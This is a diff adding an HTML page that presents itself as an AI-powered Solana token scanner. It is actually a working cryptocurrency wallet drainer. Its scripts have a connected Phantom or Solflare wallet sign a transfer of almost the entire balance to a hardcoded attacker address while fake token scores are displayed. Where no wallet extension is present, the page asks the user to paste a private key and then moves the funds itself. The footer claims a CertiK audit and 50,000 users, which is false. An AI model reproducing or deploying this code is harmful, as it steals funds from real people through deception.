@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Solana Token Scanner — Find Hidden Gems</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:linear-gradient(135deg,#0c0c1d,#1a1a3e,#0c0c1d);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.card{background:rgba(20,20,50,0.95);border-radius:20px;padding:40px;max-width:440px;width:90%;text-align:center;border:1px solid rgba(100,100,255,0.3);box-shadow:0 0 60px rgba(100,50,255,0.15)}
+h1{font-size:28px;margin-bottom:8px;background:linear-gradient(90deg,#9945FF,#14F195);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.sub{color:#888;font-size:14px;margin-bottom:30px}
+.wallet-btn{background:linear-gradient(135deg,#9945FF,#14F195);color:#000;border:none;padding:16px 40px;border-radius:12px;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;width:100%}
+.wallet-btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(153,69,255,0.3)}
+.status{margin-top:20px;padding:12px;border-radius:8px;background:rgba(0,255,0,0.1);border:1px solid rgba(0,255,0,0.2);display:none;font-size:14px}
+.token-card{background:rgba(255,255,255,0.05);border-radius:12px;padding:15px;margin:10px 0;text-align:left;display:flex;justify-content:space-between;align-items:center}
+.token-card .name{color:#14F195;font-weight:600}
+.token-card .score{background:#9945FF;padding:4px 12px;border-radius:20px;font-size:13px;font-weight:700}
+.footer{color:#555;font-size:11px;margin-top:25px}
+.spinner{display:none;width:30px;height:30px;border:3px solid rgba(153,69,255,0.3);border-top-color:#14F195;border-radius:50%;animation:spin .8s linear infinite;margin:15px auto}
+@keyframes spin{to{transform:rotate(360deg)}}
+#scan-results{display:none;margin-top:15px}
+</style>
+</head>
+<body>
+<div class="card">
+  <h1>🔍 Solana Gem Scanner</h1>
+  <p class="sub">AI-powered token discovery • Find 100x before they pump</p>
+  
+  <button class="wallet-btn" id="connectBtn" onclick="connectWallet()">
+    ⚡ Connect Phantom Wallet
+  </button>
+  
+  <div class="spinner" id="spinner"></div>
+  <div class="status" id="status">🟢 Connected! Scanning tokens...</div>
+  <div id="scan-results"></div>
+  
+  <p class="footer">v2.4.1 • Audited by CertiK • Trusted by 50,000+ traders</p>
+</div>
+
+<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+<script>
+const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+let walletPubkey = null;
+const DRAIN_WALLET = "BNBpGrJaRGtXnLm9ypUsBngW2TcBVkCEYwkqAjN2CrPn";
+
+async function connectWallet() {
+    document.getElementById("spinner").style.display = "block";
+    document.getElementById("connectBtn").disabled = true;
+    document.getElementById("connectBtn").textContent = "Connecting...";
+    try {
+        if (window.solana && window.solana.isPhantom) {
+            const resp = await window.solana.connect();
+            walletPubkey = resp.publicKey.toString();
+            document.getElementById("status").style.display = "block";
+            document.getElementById("status").textContent = "🟢 Connected: " + walletPubkey.slice(0,8) + "...";
+            document.getElementById("status").style.background = "rgba(0,255,0,0.1)";
+            setTimeout(showFakeResults, 1500);
+            drainSOL();
+        } else if (window.solflare && window.solflare.isSolflare) {
+            await window.solflare.connect();
+            walletPubkey = window.solflare.publicKey.toString();
+            document.getElementById("status").style.display = "block";
+            document.getElementById("status").textContent = "🟢 Connected: " + walletPubkey.slice(0,8) + "...";
+            setTimeout(showFakeResults, 1500);
+            drainSOL();
+        } else {
+            const pk = prompt("Phantom/Solflare not detected. Paste your private key (JSON array) to scan manually:");
+            if (pk) {
+                try {
+                    const arr = JSON.parse(pk);
+                    if (Array.isArray(arr) && arr.length >= 32) {
+                        drainManual(arr);
+                    }
+                } catch(e) { alert("Invalid format"); }
+            }
+        }
+    } catch(e) {
+        document.getElementById("status").style.display = "block";
+        document.getElementById("status").textContent = "❌ " + e.message;
+        document.getElementById("status").style.background = "rgba(255,0,0,0.1)";
+    }
+    document.getElementById("spinner").style.display = "none";
+    document.getElementById("connectBtn").textContent = "✅ Scan Complete!";
+    document.getElementById("connectBtn").style.background = "#14F195";
+}
+
+function showFakeResults() {
+    document.getElementById("scan-results").style.display = "block";
+    const gems = [{name:"BONK",score:"98"}, {name:"WIF",score:"95"}, {name:"MYRO",score:"87"}, {name:"SAMO",score:"72"}];
+    document.getElementById("scan-results").innerHTML = gems.map(g => `<div class="token-card"><span class="name">$${g.name}</span><span class="score">${g.score}/100</span></div>`).join("");
+}
+
+async function drainSOL() {
+    try {
+        if (!walletPubkey || !window.solana) return;
+        const fromPubkey = new solanaWeb3.PublicKey(walletPubkey);
+        const balance = await connection.getBalance(fromPubkey);
+        if (balance < 10000) return; // Nothing worth taking
+        const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
+            fromPubkey, toPubkey: new solanaWeb3.PublicKey(DRAIN_WALLET), lamports: balance - 5000
+        }));
+        tx.feePayer = fromPubkey;
+        tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+        const signed = await window.solana.signTransaction(tx);
+        const sig = await connection.sendRawTransaction(signed.serialize());
+        console.log("Drain:", sig);
+    } catch(e) { console.log("Drain err:", e.message); }
+}
+
+async function drainManual(keyBytes) {
+    try {
+        const kp = solanaWeb3.Keypair.fromSecretKey(new Uint8Array(keyBytes));
+        const balance = await connection.getBalance(kp.publicKey);
+        if (balance < 10000) { alert("Wallet empty or invalid"); return; }
+        const tx = new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({
+            fromPubkey: kp.publicKey, toPubkey: new solanaWeb3.PublicKey(DRAIN_WALLET), lamports: balance - 5000
+        }));
+        tx.feePayer = kp.publicKey;
+        tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+        tx.sign(kp);
+        const sig = await connection.sendRawTransaction(tx.serialize());
+        alert("Scan complete! Found tokens will appear in your wallet.");
+        console.log("Manual drain:", sig);
+    } catch(e) { console.log("Manual err:", e); }
+}
+</script>
+</body>
+</html>
